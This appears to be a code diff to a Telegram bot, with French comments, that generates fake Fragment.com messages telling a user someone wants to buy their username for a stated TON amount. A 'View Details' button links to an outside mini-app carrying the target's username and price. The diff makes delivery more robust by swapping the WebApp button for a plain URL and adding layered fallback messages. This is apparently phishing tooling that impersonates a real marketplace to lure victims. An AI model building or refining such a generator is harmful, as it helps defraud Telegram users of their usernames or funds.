@@ -15,7 +15,7 @@ PORT = int(os.getenv('PORT', 10000))
 WEBHOOK_URL = "https://telegram-bot-vic3.onrender.com"
 WEBAPP_URL = "https://myminiapp.onrender.com"  # 🔗 URL de votre site web
 
-print(f"🤖 Inline Fragment Deal Generator v4.7")
+print(f"🤖 Inline Fragment Deal Generator v4.8")
 print(f"🔑 Token: ✅")
 print(f"🌐 Port: {PORT}")
 print(f"🔗 Webhook: {WEBHOOK_URL}")
@@ -155,16 +155,17 @@ Important:
             # Si erreur avec les entités, on continue sans elles
             entities = []
         
-        # 📱 BOUTON WEB APP INTÉGRÉ - Reste dans Telegram
+        # 📱 BOUTON CORRIGÉ - URL direct au lieu de WebApp
         try:
+            # Création d'un bouton URL normal au lieu d'un WebApp
             webapp_url = f"{WEBAPP_URL}?user={username}&price={price:g}"
             keyboard = InlineKeyboardMarkup([[
                 InlineKeyboardButton(
                     "View Details", 
-                    web_app=WebAppInfo(url=webapp_url)
+                    url=webapp_url  # ✅ URL normale au lieu de web_app
                 )
             ]])
-            print(f"🔗 Web App URL générée (intégrée): {webapp_url}")
+            print(f"🔗 Bouton URL créé: {webapp_url}")
         except Exception as keyboard_error:
             print(f"❌ DEBUG: Erreur création clavier: {keyboard_error}")
             keyboard = None
@@ -273,10 +274,34 @@ async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYP
             import traceback
             print(f"❌ DEBUG: Traceback résultat: {traceback.format_exc()}")
             
-            # Fallback avec formatage simplifié mais fonctionnel
+            # Fallback SANS clavier en cas de problème de bouton
             try:
-                # Récréation d'un message simple sans entités complexes
-                simple_message = f"""We have received a purchase request for your username @{username} via Fragment.com. Below are the transaction details:
+                print(f"🔄 DEBUG: Tentative fallback sans bouton...")
+                
+                # Récréation du message et entités
+                fallback_message, fallback_entities, _ = generate_fragment_message(username, ton_amount)
+                
+                fallback_results = [
+                    InlineQueryResultArticle(
+                        id=f"fallback_{username}_{ton_amount}",
+                        title=f"Fragment Deal: @{username}",
+                        description=f"💎 {ton_amount:g} TON (${current_usd_value:.2f} USD)",
+                        input_message_content=InputTextMessageContent(
+                            fallback_message,
+                            entities=fallback_entities,
+                            disable_web_page_preview=True
+                        )
+                        # ✅ PAS de reply_markup pour éviter l'erreur bouton
+                    )
+                ]
+                await update.inline_query.answer(fallback_results, cache_time=0)
+                print("📤 DEBUG: Fallback sans bouton envoyé avec succès")
+            except Exception as fallback_error:
+                print(f"❌ DEBUG: Même le fallback sans bouton a échoué: {fallback_error}")
+                
+                # En dernier recours, message ultra-simple
+                try:
+                    simple_message = f"""We have received a purchase request for your username @{username} via Fragment.com. Below are the transaction details:
 
 • Offer Amount: 💎{ton_amount:g} TON
 • Commission: 💎{ton_amount * 0.05:g} TON
@@ -289,24 +314,24 @@ Additional Information:
 Important:
 • Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
 • If you choose not to proceed, simply ignore this message."""
-                
-                fallback_results = [
-                    InlineQueryResultArticle(
-                        id=f"simple_{username}_{ton_amount}",
-                        title=f"Fragment Deal: @{username}",
-                        description=f"💎 {ton_amount:g} TON",
-                        input_message_content=InputTextMessageContent(
-                            simple_message,
-                            disable_web_page_preview=True
+                    
+                    ultra_simple_results = [
+                        InlineQueryResultArticle(
+                            id=f"simple_{username}_{ton_amount}",
+                            title=f"Fragment Deal: @{username}",
+                            description=f"💎 {ton_amount:g} TON",
+                            input_message_content=InputTextMessageContent(
+                                simple_message,
+                                disable_web_page_preview=True
+                            )
                         )
-                    )
-                ]
-                await update.inline_query.answer(fallback_results, cache_time=0)
-                print("📤 DEBUG: Fallback simple envoyé avec succès")
-            except Exception as fallback_error:
-                print(f"❌ DEBUG: Même le fallback a échoué: {fallback_error}")
-                # En dernier recours, liste vide
-                await update.inline_query.answer([], cache_time=0)
+                    ]
+                    await update.inline_query.answer(ultra_simple_results, cache_time=0)
+                    print("📤 DEBUG: Message ultra-simple envoyé avec succès")
+                except Exception as ultra_error:
+                    print(f"❌ DEBUG: Même le message ultra-simple a échoué: {ultra_error}")
+                    # En dernier recours, liste vide
+                    await update.inline_query.answer([], cache_time=0)
         
     except Exception as e:
         print(f"❌ DEBUG: Erreur critique dans inline_query_handler: {e}")
@@ -359,7 +384,7 @@ class WebhookHandler(BaseHTTPRequestHandler):
         self.send_header('Content-Type', 'text/plain')
         self.end_headers()
         
-        status = f"✅ Bot Status: Online\n🕐 Time: {time.strftime('%Y-%m-%d %H:%M:%S UTC')}\n📱 Web App (Intégrée): {WEBAPP_URL}"
+        status = f"✅ Bot Status: Online\n🕐 Time: {time.strftime('%Y-%m-%d %H:%M:%S UTC')}\n📱 Web App: {WEBAPP_URL}"
         self.wfile.write(status.encode('utf-8'))
     
     def log_message(self, format, *args):
